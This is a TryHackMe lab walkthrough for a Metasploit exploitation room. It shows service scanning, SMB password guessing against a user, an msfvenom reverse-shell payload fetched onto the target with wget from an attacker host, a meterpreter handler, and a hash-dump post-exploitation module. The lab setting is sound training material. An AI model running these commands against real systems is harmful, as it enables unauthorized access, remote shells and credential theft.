# TryHackMe Writeup: Metasploit Exploitation

## Good to Know

> Server Message Block (SMB) is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2. It also provides an authenticated inter-process communication (IPC) mechanism.

> NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network.

## Task 2: Enumeration and Exploitation

### Useful Commands to Get Started

#### UDP Service Identification

```bash
search udp sweep
use auxiliary/scanner/udp/udp_sweep
setg RHOSTS <TARGET_HOST>
run
```

#### Django Version Scanner

```bash
search scanner django
use auxiliary/scanner/http/django_version
set RHOSTS <TARGET_HOST>
run
```

#### SMB Version Scanner

```bash
search smb version
use auxiliary/scanner/smb/smb_version
set RHOSTS <TARGET_HOST>
run
```

#### SSH Version Scanner

```bash
search ssh version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <TARGET_HOST>
run
```

### Question 1: How Many Ports Are Open?

To determine the number of open ports, use the following Nmap command:

```bash
nmap -sSV <TARGET_HOST>
```

#### Example Output

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8000/tcp open  http        WebFS httpd 1.21
```

Count the number of open ports from the output.

### Question 2: What NetBIOS Name Can You See?

To identify the NetBIOS name, use the Metasploit Framework Console with the following steps:

1. Load the NetBIOS scanner module:
   ```bash
   use auxiliary/scanner/netbios/nbname
   ```
2. Display the available options:
   ```bash
   show options
   ```
3. Set the target host:
   ```bash
   set RHOSTS <TARGET_HOST>
   ```

### Question 3: What Service Is Running on Port 8000?

To identify the service running on port 8000, use the following Nmap command:

```bash
nmap -sSV -p 8000 <TARGET_HOST>
```

### Question 4: What Is the "penny" User's SMB Password?

To find the SMB password for the "penny" user, use the Metasploit Framework Console with the following steps:

1. Load the SMB login scanner module:
   ```bash
   use auxiliary/scanner/smb/smb_login
   ```
2. Set the SMB username:
   ```bash
   set SMBUser penny
   ```
3. Specify the wordlist file for password guessing:
   ```bash
   set USERPASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
   ```
4. Set the target host:
   ```bash
   set RHOSTS <TARGET_HOST>
   ```

## Task 3: Working with the Database

### Steps to Use the Database

1. Start Metasploit:
   ```bash
   msfconsole
   ```
2. Initialize the database:
   ```bash
   sudo -u postgres msfdb init
   ```
3. Check database status:
   ```bash
   db_status
   ```
4. Create a new workspace:
   ```bash
   workspace -a tryhackme
   ```
5. Switch to the new workspace:
   ```bash
   workspace tryhackme
   ```
6. Verify the current workspace:
   ```bash
   workspace
   ```
7. Scan ports and save results to the database:
   ```bash
   db_nmap -sSV <TARGET_HOST>
   ```
8. View hosts in the database:
   ```bash
   hosts
   ```
9. View services in the database:
   ```bash
   services
   ```
10. Add hosts to the `RHOSTS` parameter:
    ```bash
    set RHOSTS -R
    ```

### Protocols and Possible Vulnerabilities

- **HTTP**: Could potentially host a web application where you can find vulnerabilities like SQL injection or Remote Code Execution (RCE).
- **FTP**: Could allow anonymous login and provide access to interesting files.
- **SMB**: Could be vulnerable to SMB exploits like MS17-010.
- **SSH**: Could have default or easy-to-guess credentials.
- **RDP**: Could be vulnerable to BlueKeep or allow desktop access if weak credentials were used.

## Task 6: Msfvenom

### You Can Connect via SSH

To SSH into the target machine, use the following command:

```bash
ssh murphy@<TARGET_HOST>

# Proceed with the password provided in the room.
```

### Generating a Payload with Msfvenom

To create a reverse shell payload using `msfvenom`, use the following command:

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ATTACKING_MACHINE_IP> LPORT=<SOME_PORT> -f elf > rev_shell.elf
```

### Transfer the Payload to the Target Machine

First, start a simple HTTP server on your attacking machine and download the payload on the target machine.

   ```bash
   python3 -m http.server 9000
   ```

   ```bash
   wget http://ATTACKING_MACHINE_IP:9000/rev_shell.elf
   ```

### Get a Meterpreter Session on the Target Machine

```bash
use exploit/multi/handler 
show payloads
set payload linux/x86/meterpreter/reverse_tcp
set lhost <ATTACKING_MACHINE_IP>
set lport <SOME_PORT>
exploit

# Output example
[+] Started reverse TCP handler on ...
```

On the target machine, run the payload:

```bash
chmod +x rev_shell.elf
./rev_shell.elf
```

### Post Exploitation (Dump Hashes From Linux Machine)

```bash
search dump type:post
post(linux/gather/hashdump)
set SESSION <SESSION_ID>
run
```

### Clean Up
To remove the payload from the target machine, use the following command:
```bash
rm rev_shell.elf
```